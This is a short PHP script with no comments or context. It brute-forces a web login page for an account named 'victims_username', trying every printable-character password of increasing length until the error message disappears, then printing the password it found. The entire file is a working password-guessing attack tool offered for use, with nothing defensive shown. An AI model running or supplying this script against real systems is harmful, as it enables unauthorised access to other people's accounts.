<?php
$url = 'http://example.com/login.php';
$post_data = array('username' => 'victims_username');
$length = 0;
$password = array();
$chr = array_combine(range(32, 126), array_map('chr', range(32, 126)));
$ord = array_flip($chr);
$first = reset($chr);
$last = end($chr);
while (true) {
  $length++;
  $end = $length-1;
  $password = array_fill(0, $length, $first);
  $stop = array_fill(0, $length, $last);
  while ($password != $stop) {
    foreach ($chr as $string) {
      $password[$end] = $string;
      $post_data['password'] = implode('', $password);
      $context = stream_context_create(array('http' => array(
        'method' => 'POST',
        'follow_location' => false,
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($post_data)
      )));
      $response = file_get_contents($url, false, $context);
      if (strpos($response, 'Invalid username or password.') === false) {
        echo 'Password found: ' . $post_data['password'], PHP_EOL;
        exit;
      }
    }
    for ($left = $end-1; isset($password[$left]) && $password[$left] == $last; $left--);
    if (isset($password[$left]) && $password[$left] != $last) {
      $password[$left] = $chr[$ord[$password[$left]]+1];
      for ($index = $left+1; $index <= $length; $index++) {
        $password[$index] = $first;
      }
    }
  }
}
